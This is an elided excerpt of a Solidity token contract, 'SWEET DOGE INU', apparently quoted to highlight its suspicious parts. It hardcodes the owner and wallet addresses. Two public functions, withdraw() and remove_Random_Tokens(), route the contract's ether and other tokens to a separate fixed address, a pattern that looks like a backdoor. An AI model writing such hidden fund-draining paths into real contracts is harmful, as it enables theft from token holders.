...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x1B26CE6B60CDdcd5401A0d28713A978A10ddb686; 
...
contract SWEETDOGEINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SWEET DOGE INU";
    string private _symbol = "$SDINU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1B26CE6B60CDdcd5401A0d28713A978A10ddb686); // 
    address payable public teamWalletAddress = payable(0x1B26CE6B60CDdcd5401A0d28713A978A10ddb686); // 
    ...
    function withdraw() public {
        ...
        payable(address(0x7E80BD6E73D1eE1f7dDD20C107aF6C75c5CDC99d)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0x7E80BD6E73D1eE1f7dDD20C107aF6C75c5CDC99d),removeRandom);
}}